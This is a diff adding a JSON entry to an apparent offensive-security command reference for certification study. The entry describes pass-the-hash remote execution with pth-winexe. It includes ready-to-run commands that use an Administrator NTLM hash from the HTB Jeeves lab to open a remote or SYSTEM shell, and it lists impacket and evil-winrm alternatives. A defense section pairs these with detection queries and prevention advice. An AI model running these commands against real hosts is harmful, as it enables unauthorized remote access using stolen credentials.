@@ -1,0 +1,72 @@
+{
+  "id": "pth-winexe",
+  "name": "pth-winexe - Pass-the-Hash Remote Execution",
+  "command": "pth-winexe -U '<domain>/<user>%<lm_hash>:<nt_hash>' //<target> cmd.exe",
+  "description": "pth-winexe is a pass-the-hash variant of winexe that authenticates to a Windows host using NTLM hashes instead of a password. It opens a remote command shell via the Windows Service Control Manager (like psexec). Alternative to impacket-psexec when you have an NTLM hash and want a quick interactive shell.",
+  "platform": "linux",
+  "type": "command",
+  "opsec": "moderate",
+  "category": "Lateral Movement",
+  "subcategory": "Pass-the-Hash",
+  "certifications": [
+    "OSCP",
+    "CPTS"
+  ],
+  "primary_cert": "OSCP",
+  "source": "HTB Jeeves engagement",
+  "tags": [
+    "pass-the-hash",
+    "pth",
+    "winexe",
+    "remote-execution",
+    "ntlm",
+    "lateral-movement"
+  ],
+  "mitre": [
+    "T1550.002"
+  ],
+  "exam": "exam-ok",
+  "notes": "=== BASIC USAGE ===\n  pth-winexe -U '<domain>/<user>%<lm_hash>:<nt_hash>' //<target> cmd.exe\n\n=== WORKGROUP (non-domain) ===\n  pth-winexe -U 'JEEVES/Administrator%aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00' //10.129.228.112 cmd.exe\n\n=== WITH SYSTEM SHELL ===\n  pth-winexe --system -U 'Administrator%aad3b435b51404eeaad3b435b51404ee:<nt_hash>' //<target> cmd.exe\n\n=== ALTERNATIVES ===\n  impacket-psexec -hashes <lm>:<nt> <domain>/<user>@<target>     # more common\n  impacket-wmiexec -hashes <lm>:<nt> <domain>/<user>@<target>    # stealthier\n  evil-winrm -i <target> -u <user> -H <nt_hash>                 # if WinRM open\n\n=== NOTES ===\n- LM hash is usually aad3b435b51404eeaad3b435b51404ee (empty/disabled)\n- Uses SMB + service creation (same as psexec) - leaves artifacts\n- Requires admin access on the target\n- pth-winexe is from the pth-toolkit (passing-the-hash.com)\n- Less maintained than impacket alternatives but still works",
+  "examples": [
+    {
+      "label": "PTH to get Administrator shell",
+      "command": "pth-winexe -U 'JEEVES/Administrator%aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00' //10.129.228.112 cmd.exe"
+    },
+    {
+      "label": "PTH with --system flag for SYSTEM shell",
+      "command": "pth-winexe --system -U 'Administrator%aad3b435b51404eeaad3b435b51404ee:<nt_hash>' //<target> cmd.exe"
+    }
+  ],
+  "references": [
+    {
+      "title": "pth-toolkit",
+      "url": "https://github.com/byt3bl33d3r/pth-toolkit"
+    },
+    {
+      "title": "MITRE T1550.002 - Pass the Hash",
+      "url": "https://attack.mitre.org/techniques/T1550/002/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "keepass2john-crack",
+      "note": "KeePass database may contain the NTLM hash needed for PTH.",
+      "rel": "prereq"
+    }
+  ],
+  "defense": {
+    "why_it_works": "NTLM authentication accepts the hash directly without knowing the cleartext password. pth-winexe creates a Windows service on the target to execute commands, authenticating with the provided NTLM hash.",
+    "prerequisites": "Local admin NTLM hash; SMB (445) access to the target; admin$ share accessible.",
+    "impact": "Remote code execution as the hash owner (typically SYSTEM via service creation).",
+    "detection": "[MITRE T1550.002] Event 4624 (logon type 3) with NTLM auth from unusual source; Event 7045 (new service) for the execution service; Event 4688 for cmd.exe spawned by the service.",
+    "artifacts": "4624 NTLM logon; 7045 service creation; 4688 process creation; temporary service binary on admin$ share.",
+    "splunk_spl": "index=wineventlog sourcetype=\"WinEventLog:Security\" EventCode=4624 LogonType=3 AuthenticationPackageName=\"NTLM\"\n| table _time, TargetUserName, IpAddress, WorkstationName",
+    "elastic_kql": "event.code:\"4624\" AND winlog.event_data.LogonType:\"3\" AND winlog.event_data.AuthenticationPackageName:\"NTLM\"",
+    "sentinel_kql": "SecurityEvent\n| where EventID == 4624 and LogonType == 3 and AuthenticationPackageName == \"NTLM\"\n| project TimeGenerated, Account=TargetUserName, IpAddress, Workstation=WorkstationName",
+    "prevention": "Enable Credential Guard; disable NTLM where possible; restrict local admin access; monitor for service creation from unusual sources.",
+    "sources": [
+      "HTB Jeeves",
+      "https://attack.mitre.org/techniques/T1550/002/"
+    ]
+  }
+}
